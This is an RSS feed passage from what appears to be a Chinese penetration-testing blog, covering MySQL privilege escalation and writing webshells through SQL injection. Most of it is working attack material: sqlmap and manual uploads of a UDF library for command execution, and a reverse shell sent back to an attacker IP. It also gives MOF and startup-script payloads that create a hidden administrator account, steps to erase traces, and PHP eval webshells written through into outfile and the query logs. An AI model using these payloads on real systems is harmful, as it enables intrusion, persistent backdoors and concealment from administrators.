&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;找MySQL安装目录：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;mysql&amp;gt; select @@basedir;
&lt;/code&gt;&lt;/pre&gt;&lt;/blockquote&gt;
&lt;h4 id=&#34;写入动态链接库&#34;&gt;写入动态链接库&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;前提：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;存在SQL注入或可操作原生SQL语句&lt;/li&gt;
&lt;li&gt;用户有&lt;strong&gt;file_priv&lt;/strong&gt;权限&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;secure_file_priv&lt;/strong&gt; 无限制&lt;/li&gt;
&lt;li&gt;插件目录对于MySQL用户可写&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;使用sqlmap上传动态链接库：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sqlmap -u &amp;quot;http://127.0.0.1/&amp;quot; --data=&amp;quot;id=1&amp;quot; --file-write=&amp;quot;/path/to/lib_mysqludf_sys_64.so&amp;quot; --file-dest=&amp;quot;/usr/lib/mysql/plugin/udf.so&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;手工写入：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 直接十六进制写入
select 0x..... INTO DUMPFILE &#39;/usr/lib/mysql/plugin/udf.so&#39;;

# 本地执行SQL语句，直接传路径获取动态链接库的十六进制
SELECT hex(load_file(&#39;/lib_mysqludf_sys_64.so&#39;));

# 本地执行SQL语句,路径hex编码获取动态链接库的十六进制
SELECT hex(load_file(0x2f6c69625f6d7973716c7564665f7379735f36342e736f));
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;创建函数-执行命令&#34;&gt;创建函数-执行命令&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;udf.dll&#39;;
select sys_eval(&#39;whoami&#39;);
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;所获得的权限最终如何仍需要看运行MySQL服务的权限，以什么样的权限运行MySQL服务，获取到的就是相应的权限&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;清理痕迹&#34;&gt;清理痕迹&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;drop function sys_eval;
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;msf自动化实现&#34;&gt;msf自动化实现&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf6 &amp;gt; exploit(multi/mysql/mysql_udf_payload) 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 234; 
			flex-basis: 562px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/mysql-1/image-20220216154622289.png&#34; data-size=&#34;1114x475&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/mysql-1/image-20220216154622289.png&#34;
			width=&#34;1114&#34;
			height=&#34;475&#34;
			srcset=&#34;https://coollllllll.github.io/p/mysql-1/image-20220216154622289_huc0a30ac64d8e7864cdc9268eef3ed765_111403_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/mysql-1/image-20220216154622289_huc0a30ac64d8e7864cdc9268eef3ed765_111403_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;udf-shell&#34;&gt;UDF shell&lt;/h3&gt;
&lt;p&gt;当目标 MySQL 在内网中，无法直连 MySQL 或者 MySQL 不允许外连，这个时候可以上传一些脚本，通过脚本进行本地连接和操作。&lt;/p&gt;
&lt;h4 id=&#34;udf大马&#34;&gt;UDF大马&lt;/h4&gt;
&lt;p&gt;可上传UDF命令执行大马：&lt;code&gt;https://github.com/echohun/tools/blob/master/大马/udf.php&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;navicat-自带脚本&#34;&gt;Navicat 自带脚本&lt;/h4&gt;
&lt;p&gt;目标MySQL不允许外连，可以上传navicat自带的 tunnel 隧道脚本：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 358; 
			flex-basis: 860px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/mysql-1/image-20220215152223882.png&#34; data-size=&#34;251x70&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/mysql-1/image-20220215152223882.png&#34;
			width=&#34;251&#34;
			height=&#34;70&#34;
			srcset=&#34;https://coollllllll.github.io/p/mysql-1/image-20220215152223882_huf5d19982b7d64a73ab3a47912f065ed9_1731_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/mysql-1/image-20220215152223882_huf5d19982b7d64a73ab3a47912f065ed9_1731_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;image-20220215152223882&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;image-20220215152223882&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 157; 
			flex-basis: 377px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/mysql-1/image-20220215153234679.png&#34; data-size=&#34;618x393&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/mysql-1/image-20220215153234679.png&#34;
			width=&#34;618&#34;
			height=&#34;393&#34;
			srcset=&#34;https://coollllllll.github.io/p/mysql-1/image-20220215153234679_hue4047726d92f6d80d19e29759dee78ae_23748_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/mysql-1/image-20220215153234679_hue4047726d92f6d80d19e29759dee78ae_23748_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;接着使用navicat连接，设置HTTP通道：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 243; 
			flex-basis: 584px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/mysql-1/image-20220215154826255.png&#34; data-size=&#34;524x215&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/mysql-1/image-20220215154826255.png&#34;
			width=&#34;524&#34;
			height=&#34;215&#34;
			srcset=&#34;https://coollllllll.github.io/p/mysql-1/image-20220215154826255_hud399a6952f5d87dad59374550eb17ba1_10871_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/mysql-1/image-20220215154826255_hud399a6952f5d87dad59374550eb17ba1_10871_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 184; 
			flex-basis: 443px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/mysql-1/image-20220215154850087.png&#34; data-size=&#34;516x279&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/mysql-1/image-20220215154850087.png&#34;
			width=&#34;516&#34;
			height=&#34;279&#34;
			srcset=&#34;https://coollllllll.github.io/p/mysql-1/image-20220215154850087_hu9edf6839555aec566b258cbcc31410a4_11512_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/mysql-1/image-20220215154850087_hu9edf6839555aec566b258cbcc31410a4_11512_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;成功连接后手动实现UDF提权就可。&lt;/p&gt;
&lt;h3 id=&#34;反弹端口提权&#34;&gt;反弹端口提权&lt;/h3&gt;
&lt;p&gt;UDF提权的另一种用法，所使用的动态链接库是经定制过的，功能更多更加使用：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cmdshell        # 执行cmd
downloader      # 下载者,到网上下载指定文件并保存到指定目录
open3389        # 通用开3389终端服务,可指定端口(不改端口无需重启)
backshell       # 反弹Shell
ProcessView     # 枚举系统进程
KillProcess     # 终止指定进程
regread         # 读注册表
regwrite        # 写注册表
shut            # 关机,注销,重启
about           # 说明与帮助函数
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在攻击机器上开启NC监听，向目标机器上导入dll，然后创建自定义函数：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;CREATE FUNCTION backshell RETURNS STRING SONAME &#39;udf.dll&#39;;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;反弹shell：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;select backshell(&amp;quot;IP&amp;quot;, 7777);
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;mof提权&#34;&gt;MOF提权&lt;/h2&gt;
&lt;p&gt;该漏洞比较有历史，基本在Windows Server 2003 的环境下才可以成功。&lt;/p&gt;
&lt;h3 id=&#34;原理&#34;&gt;原理&lt;/h3&gt;
&lt;p&gt;提权的原理是 &lt;code&gt;C:/Windows/system32/wbem/mof/&lt;/code&gt; 目录下的 mof 文件每隔一段时间（几秒钟左右）都会被系统执行，因为这个 MOF 里面有一部分是 VBS 脚本，所以可以利用这个 VBS 脚本来调用 CMD 以执行系统命令，如果 MySQL 有权限操作 mof 目录的话，就可以来执行任意命令了。&lt;/p&gt;
&lt;h3 id=&#34;手工实现&#34;&gt;手工实现&lt;/h3&gt;
&lt;h4 id=&#34;mof文件&#34;&gt;mof文件&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;#pragma namespace(&amp;quot;\\\\.\\root\\subscription&amp;quot;) 

instance of __EventFilter as $EventFilter 
{ 
    EventNamespace = &amp;quot;Root\\Cimv2&amp;quot;; 
    Name  = &amp;quot;filtP2&amp;quot;; 
    Query = &amp;quot;Select * From __InstanceModificationEvent &amp;quot; 
            &amp;quot;Where TargetInstance Isa \&amp;quot;Win32_LocalTime\&amp;quot; &amp;quot; 
            &amp;quot;And TargetInstance.Second = 5&amp;quot;; 
    QueryLanguage = &amp;quot;WQL&amp;quot;; 
}; 

instance of ActiveScriptEventConsumer as $Consumer 
{ 
    Name = &amp;quot;consPCSV2&amp;quot;; 
    ScriptingEngine = &amp;quot;JScript&amp;quot;; 
    ScriptText = 
&amp;quot;var WSH = new ActiveXObject(\&amp;quot;WScript.Shell\&amp;quot;)\nWSH.run(\&amp;quot;net.exe user hacker P@ssw0rd /add\&amp;quot;)\nWSH.run(\&amp;quot;net.exe localgroup administrators hacker /add\&amp;quot;)&amp;quot;; 
}; 

instance of __FilterToConsumerBinding 
{ 
    Consumer   = $Consumer; 
    Filter = $EventFilter; 
};
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;该payload核心部分就是创建用户并加入管理员组。&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;写文件&#34;&gt;写文件&lt;/h4&gt;
&lt;p&gt;将该文件内容以hex格式写入到&lt;code&gt;C:/Windows/system32/wbem/mof/ &lt;/code&gt;下：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;select 0xinto dumpfile &amp;quot;C:/windows/system32/wbem/mof/test.mof&amp;quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;执行成功的的时候，test.mof 会出现在：&lt;code&gt;c:/windows/system32/wbem/good/&lt;/code&gt; 目录下，否则出现在 &lt;code&gt;c:/windows/system32/wbem/bad &lt;/code&gt;目录下。&lt;/p&gt;
&lt;h4 id=&#34;痕迹清理&#34;&gt;痕迹清理&lt;/h4&gt;
&lt;p&gt;写入后每隔几分钟时间又会重新执行添加用户的命令，所以想要清理痕迹得先暂时关闭 &lt;code&gt;winmgmt &lt;/code&gt;服务再删除相关 mof 文件，这个时候再删除用户才会有效果：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 停止 winmgmt 服务
net stop winmgmt

# 删除 Repository 文件夹
rmdir /s /q C:\Windows\system32\wbem\Repository\

# 手动删除 mof 文件
del C:\Windows\system32\wbem\mof\good\test.mof /F /S

# 删除创建的用户
net user hacker /delete

# 重新启动服务
net start winmgmt
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;msf自动化实现-1&#34;&gt;msf自动化实现&lt;/h4&gt;
&lt;p&gt;MSF自带MOF提权模块，也自带痕迹清理功能：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf6 &amp;gt; use exploit/windows/mysql/mysql_mof
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 325; 
			flex-basis: 781px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/mysql-1/image-20220216154459923.png&#34; data-size=&#34;990x304&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/mysql-1/image-20220216154459923.png&#34;
			width=&#34;990&#34;
			height=&#34;304&#34;
			srcset=&#34;https://coollllllll.github.io/p/mysql-1/image-20220216154459923_hu605f86c2839343ae8b816fd87a4952df_58975_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/mysql-1/image-20220216154459923_hu605f86c2839343ae8b816fd87a4952df_58975_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;启动项提权&#34;&gt;启动项提权&lt;/h2&gt;
&lt;p&gt;常见于 Windows 环境下，当 &lt;strong&gt;Windows 的启动项可以被 MySQL 写入的时候，可以使用 MySQL 将自定义脚本导入到启动项&lt;/strong&gt;中，这个脚本会在用户登录、开机、关机的时候自动运行。&lt;/p&gt;
&lt;h3 id=&#34;启动项路径&#34;&gt;启动项路径&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Windows Server 2003的启动项路径&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 中文系统
C:\Documents and Settings\Administrator\「开始」菜单\程序\启动
C:\Documents and Settings\All Users\「开始」菜单\程序\启动

# 英文系统
C:\Documents and Settings\Administrator\Start Menu\Programs\Startup
C:\Documents and Settings\All Users\Start Menu\Programs\Startup

# 开关机项 需要手动建立对应文件夹
C:\WINDOWS\system32\GroupPolicy\Machine\Scripts\Startup
C:\WINDOWS\system32\GroupPolicy\Machine\Scripts\Shutdown

&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;Windows Server 2008 的启动项路径&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;路径已知的话即可写入脚本，支持vbs和exe类型，&lt;strong&gt;可以vbs执行一些CMD命令，也可以用exe上线MSF或CS&lt;/strong&gt;：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Set WshShell=WScript.CreateObject(&amp;quot;WScript.Shell&amp;quot;)
WshShell.Run &amp;quot;net user hacker P@ssw0rd /add&amp;quot;, 0
WshShell.Run &amp;quot;net localgroup administrators hacker /add&amp;quot;, 0
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;写入启动项&#34;&gt;写入启动项&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;mysql &amp;gt; select 0x... into dumpfile &amp;quot;C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\test.vbs&amp;quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;写入成功后，等待系统用户重新登录，登录成功的话，自定义脚本就会被执行。&lt;/p&gt;
&lt;h3 id=&#34;msf自动化实现-2&#34;&gt;msf自动化实现&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf6 &amp;gt; use exploit/windows/mysql/mysql_start_up
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 196; 
			flex-basis: 471px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/mysql-1/image-20220216154257397.png&#34; data-size=&#34;1119x570&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/mysql-1/image-20220216154257397.png&#34;
			width=&#34;1119&#34;
			height=&#34;570&#34;
			srcset=&#34;https://coollllllll.github.io/p/mysql-1/image-20220216154257397_huc41fefccdd2c676fee4a693df9efe9f8_92393_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/mysql-1/image-20220216154257397_huc41fefccdd2c676fee4a693df9efe9f8_92393_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;cve-2016-6663&#34;&gt;CVE-2016-6663&lt;/h2&gt;
&lt;p&gt;这是一个竞争条件漏洞，一个拥有 CREATE/INSERT/SELECT 权限的低权限账户提权成功后可以&lt;code&gt;mysql&lt;/code&gt;系统用户身份执行代码。&lt;/p&gt;
&lt;p&gt;exp参考链接：https://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html&lt;/p&gt;
&lt;h3 id=&#34;影响范围&#34;&gt;影响范围&lt;/h3&gt;
&lt;p&gt;MySQL 版本需要 &amp;lt;=5.5.51 或 5.6.x &amp;lt;=5.6.32 或 5.7.x &amp;lt;=5.7.14 或 8.x &amp;lt; 8.0.1&lt;/p&gt;
&lt;p&gt;MariaDB 版本需要 &amp;lt;= 5.5.51 或 10.0.x &amp;lt;= 10.0.27 或 10.1.x &amp;lt;= 10.1.17&lt;/p&gt;
&lt;h3 id=&#34;利用&#34;&gt;利用&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;先Getshell拿到www-data权限&lt;/li&gt;
&lt;li&gt;通过webshell管理工具上传CVE-2016-6663的exp&lt;/li&gt;
&lt;li&gt;在交互式shell中编译该exp&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;gcc mysql-privesc-race.c -o mysql-privesc-race -I/usr/include/mysql -lmysqlclient
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;执行&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# ./mysql-privesc-race 数据库用户名 密码 数据库地址 数据库
./mysql-privesc-race test 123456 localhost test
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;最终可提权为mysql用户。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;可配合CVE-2016-6664提升为root用户。&lt;/p&gt;
&lt;p&gt;参见：https://xz.aliyun.com/t/1122&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;参考：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://xz.aliyun.com/t/1122&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://xz.aliyun.com/t/1122&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.sqlsec.com/2020/11/mysql.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.sqlsec.com/2020/11/mysql.html&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>MySQL 注入写 shell</title>
        <link>https://coollllllll.github.io/p/mysql-2/</link>
        <pubDate>Fri, 09 Oct 2020 00:00:00 +0000</pubDate>
        
        <guid>https://coollllllll.github.io/p/mysql-2/</guid>
        <description>&lt;img src="https://coollllllll.github.io/p/mysql-2/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post MySQL 注入写 shell" /&gt;&lt;h1 id=&#34;mysql注入写shell&#34;&gt;MySQL注入写shell&lt;/h1&gt;
&lt;h2 id=&#34;into-outfile写shell&#34;&gt;into outfile写shell&lt;/h2&gt;
&lt;p&gt;outfile()&lt;/p&gt;
&lt;p&gt;dumpfile()&lt;/p&gt;
&lt;h3 id=&#34;注意点&#34;&gt;注意点&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;二者函数的路径不支持hex和char转换，必须由引号包裹&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;outfile函数可以导出多行，dumpfile函数只能导出一行数据&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;outfile函数在将数据写到文件里时有特殊的格式转换，dumpfile函数保持原数据格式&lt;/p&gt;
&lt;p&gt;比如：写入a\naa\raaa&lt;/p&gt;
&lt;p&gt;outfile会在将&amp;quot;\n&amp;quot;转义，并且在文件末尾新加入一行，结果为4行；而dumpfile则是原格式写入，没有转义，没有新增行，结果为三行&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;写入路径中指定的文件必须不存在，即无法覆盖写入&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;前提条件&#34;&gt;前提条件&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;1. file_priv&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;代表用户所具有的文件操作权限&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 418; 
			flex-basis: 1005px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/mysql-2/image-20210529153840281.png&#34; data-size=&#34;490x117&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/mysql-2/image-20210529153840281.png&#34;
			width=&#34;490&#34;
			height=&#34;117&#34;
			srcset=&#34;https://coollllllll.github.io/p/mysql-2/image-20210529153840281_hu5587781103156aaa2882e72e43f17fd3_11985_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/mysql-2/image-20210529153840281_hu5587781103156aaa2882e72e43f17fd3_11985_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. secure_file_priv&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;代表mysql服务器所具有的文件操作权限&lt;/p&gt;
&lt;p&gt;其值在mysql配置文件my.ini中设置，用作限制导入导出&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;mysql&amp;gt;=5.5.53默认为NULL，即默认禁止导入导出&lt;/li&gt;
&lt;li&gt;mysql&amp;lt;5.5.53默认为空，即默认无限制&lt;/li&gt;
&lt;li&gt;当其值=某目录时，即仅允许在该目录下导入导出&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;查看secure_file_priv&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 345; 
			flex-basis: 828px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/mysql-2/image-20210529154624966.png&#34; data-size=&#34;421x122&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/mysql-2/image-20210529154624966.png&#34;
			width=&#34;421&#34;
			height=&#34;122&#34;
			srcset=&#34;https://coollllllll.github.io/p/mysql-2/image-20210529154624966_hu03351eb40ee1108259e293bef2a45d49_11962_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/mysql-2/image-20210529154624966_hu03351eb40ee1108259e293bef2a45d49_11962_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 知晓绝对路径且有写权限&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;利用&#34;&gt;利用&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# SQL
?id=-1&#39; union select &#39;&amp;lt;?php phpinfo(); ?&amp;gt;&#39; into outfile &#39;/var/www/html/shell.php&#39;;

?id=1 limit 1 into outfile &#39;C:/wamp64/www/work/shell.php&#39; lines terminated by &#39;&amp;lt;?php phpinfo() ?&amp;gt;&#39;;
&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# sqlmap
sqlmap -u &amp;quot;http://x.x.x.x/?id=x&amp;quot; --file-write=&amp;quot;/tmp/shell.php&amp;quot; --file-dest=&amp;quot;/var/www/html/test/shell.php&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;注意：&lt;/p&gt;
&lt;p&gt;一般情况下，Linux系统中MySQL用户不拥有站点根目录的写权限，所以无法写入；在Windows环境下成功率更高。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;日志写shell&#34;&gt;日志写shell&lt;/h2&gt;
&lt;p&gt;MySQL 5.0 版本以上会创建日志文件，因此可通过修改日志的全局变量来 getshell&lt;/p&gt;
&lt;h3 id=&#34;注意点-1&#34;&gt;注意点&lt;/h3&gt;
&lt;p&gt;日志路径可hex，但是写入日志的内容必须引号包裹，如果内容中被转义加上反斜杠\，传至数据库会报错&lt;/p&gt;
&lt;h3 id=&#34;前提条件-1&#34;&gt;前提条件&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;绝对路径&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;file_priv&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;不受secure_file_priv限制了&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;mysql用户有权限开启日志记录和更换日志路径&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 311; 
			flex-basis: 746px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/mysql-2/image-20220209175734109.png&#34; data-size=&#34;417x134&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/mysql-2/image-20220209175734109.png&#34;
			width=&#34;417&#34;
			height=&#34;134&#34;
			srcset=&#34;https://coollllllll.github.io/p/mysql-2/image-20220209175734109_hu9208b1973513c5e2e67a137335abaea7_14111_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/mysql-2/image-20220209175734109_hu9208b1973513c5e2e67a137335abaea7_14111_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 291; 
			flex-basis: 698px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/mysql-2/image-20220209175804413.png&#34; data-size=&#34;428x147&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/mysql-2/image-20220209175804413.png&#34;
			width=&#34;428&#34;
			height=&#34;147&#34;
			srcset=&#34;https://coollllllll.github.io/p/mysql-2/image-20220209175804413_hu32885edc5acb82afac53b8f9573fbef9_17931_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/mysql-2/image-20220209175804413_hu32885edc5acb82afac53b8f9573fbef9_17931_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;默认路径中如果是文件的相对路径，一般指在MySQL安装目录下生成&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;利用-1&#34;&gt;利用&lt;/h3&gt;
&lt;p&gt;mysql日志：&lt;strong&gt;错误日志、查询日志、慢查询日志、事务日志、二进制日志&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;其中可利用的为：&lt;strong&gt;慢查询日志和查询日志&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;慢查询日志&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;记录查询时间超过指定时间(默认10s)的日志&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;set global slow_query_log=1;
set global slow_query_log_file=&#39;xxx/logshell.php&#39;;
select &amp;quot;&amp;lt;?php eval($_POST[log]);?&amp;gt;&amp;quot; from xxx where sleep(11);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;查询日志&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;set global general_log=&#39;on&#39;;
set global general_log_file=&#39;xxx/shell.php&#39;;
select &#39;&amp;lt;?php @eval($_POST[&amp;quot;log&amp;quot;]); ?&amp;gt;&#39;;
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
